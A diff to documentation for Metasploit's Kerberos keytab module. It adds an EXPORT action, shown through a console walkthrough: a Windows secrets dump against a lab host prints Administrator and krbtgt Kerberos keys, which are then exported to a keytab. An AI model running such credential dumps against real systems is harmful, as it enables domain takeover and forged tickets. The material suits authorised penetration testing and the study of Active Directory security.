@@ -15,6 +15,7 @@ The following actions are supported:
 
 1. **LIST** - List the entries in the keytab file [Default]
 2. **ADD** - Add a new entry to the keytab file
+3. **EXPORT** - Export known Kerberos encryption keys from the database
 
 ## Scenarios
 
@@ -52,6 +53,48 @@ msf6 auxiliary(admin/kerberos/ktutil) > run action=ADD keytab_file=./example.key
 [*] modifying existing keytab
 [*] Generating key with salt: DEMO.LOCALAdministrator. The SALT option can be set manually
 [+] keytab entry added to ./example.keytab
+```
+
+### Export
+
+Export Kerbeors encryption keys stored in the Metasploit database to a keytab file. This functionality is useful in conjunction with secrets dump
+
+```
+# Secrets dump
+msf6 auxiliary(gather/windows_secrets_dump) > auxiliary/gather/windows_secrets_dump
+msf6 auxiliary(gather/windows_secrets_dump) > rerun username=Administrator password=p4$$w0rd rhosts=192.168.123.13
+... ommitted ...
+# Kerberos keys:
+Administrator:aes256-cts-hmac-sha1-96:56c3bf6629871a4e4b8ec894f37489e823bbaecc2a0a4a5749731afa9d158e01
+Administrator:aes128-cts-hmac-sha1-96:df990c21c4e8ea502efbbca3aae435ea
+Administrator:des-cbc-md5:ad49d9d92f5da170
+Administrator:des-cbc-crc:ad49d9d92f5da170
+krbtgt:aes256-cts-hmac-sha1-96:e1c5500ffb883e713288d8037651821b9ecb0dfad89e01d1b920fe136879e33c
+krbtgt:aes128-cts-hmac-sha1-96:ba87b2bc064673da39f40d37f9daa9da
+krbtgt:des-cbc-md5:3ddf2f627c4cbcdc
+... ommitted ...
+[*] Auxiliary module execution completed
+
+# Export to keytab
+msf6 auxiliary(gather/windows_secrets_dump) > use admin/kerberos/keytab
+msf6 auxiliary(admin/kerberos/keytab) > run action=EXPORT keytab_file=./example.keytab
+[*] Running module against 127.0.0.1
+
+[+] keytab saved to ./example.keytab
+Keytab entries
+==============
+
+ kvno  type              principal                                   hash                                                              date
+ ----  ----              ---------                                   ----                                                              ----
+ 1     18 (AES256)       Administrator@adf3.local                    56c3bf6629871a4e4b8ec894f37489e823bbaecc2a0a4a5749731afa9d158e01  1970-01-01 01:00:00 +0100
+ 1     17 (AES128)       Administrator@adf3.local                    df990c21c4e8ea502efbbca3aae435ea                                  1970-01-01 01:00:00 +0100
+ 1     3  (DES_CBC_MD5)  Administrator@adf3.local                    ad49d9d92f5da170                                                  1970-01-01 01:00:00 +0100
+ 1     1  (DES_CBC_CRC)  Administrator@adf3.local                    ad49d9d92f5da170                                                  1970-01-01 01:00:00 +0100
+ 1     18 (AES256)       krbtgt@adf3.local                           e1c5500ffb883e713288d8037651821b9ecb0dfad89e01d1b920fe136879e33c  1970-01-01 01:00:00 +0100
+ 1     17 (AES128)       krbtgt@adf3.local                           ba87b2bc064673da39f40d37f9daa9da                                  1970-01-01 01:00:00 +0100
+ 1     3  (DES_CBC_MD5)  krbtgt@adf3.local                           3ddf2f627c4cbcdc                                                  1970-01-01 01:00:00 +0100
+... ommitted ...
+[*] Auxiliary module execution completed
 ```
 
 ### Common Mistakes
